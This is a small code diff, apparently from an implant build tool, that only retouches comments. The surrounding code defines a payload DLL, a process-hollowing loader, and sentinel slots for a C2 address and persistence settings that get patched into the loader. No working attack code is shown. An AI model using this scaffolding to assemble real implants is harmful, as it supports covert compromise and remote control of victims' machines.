@@ -7,7 +7,7 @@ import os
 
 from . import pe, toolchain
 
-# key, relative path, human description, required for a complete payload set
+# key, relative path, human description, required for a complete payload set.
 ARTIFACTS = (
     ("ckdll", "bin/ckdll.dll", "payload DLL", True),
     ("loader", "bin/loader.exe", "hollowing loader", True),
@@ -16,7 +16,7 @@ ARTIFACTS = (
     ("ckdll.pdb", "bin/ckdll.pdb", "payload symbols", False),
 )
 
-# loader sentinels: (name, sentinel, slot)
+# Loader sentinels: (name, sentinel, slot).
 SENTINELS = (
     ("c2", b"CKC2_DEADBEEF_", 256),
     ("persist", b"CKPR____", 8),
@@ -78,7 +78,7 @@ def sentinels(root):
         elif ready == -2:
             state = "patched"
         elif idx >= 0:
-            state = "invalid"          # literal exists only where it must not be written
+            state = "invalid"          # Literal exists only where it must not be written
         else:
             state = "missing"
         if name in PATCHED and blob.find(PATCHED[name]) != -1:
